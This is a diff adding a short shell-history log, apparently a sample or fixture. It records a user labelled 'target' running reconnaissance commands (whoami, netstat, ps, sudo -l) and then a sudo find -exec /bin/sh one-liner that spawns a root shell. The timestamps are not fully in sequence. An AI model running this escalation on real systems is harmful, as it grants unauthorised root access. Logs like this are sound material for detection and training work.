@@ -1,0 +1,6 @@
+[username: target] 847  2024-01-01 15:13:36 whoami
+[username: target] 848  2024-01-01 15:13:42 netstat -tunapl
+[username: target] 849  2024-01-01 15:13:45 ps -aux
+[username: target] 850  2024-01-01 15:14:05 sudo -l
+[username: target] 851  2024-01-01 15:15:07 hist
+[username: target] 852  2024-01-01 15:14:23 sudo find . -exec /bin/sh ; -quit
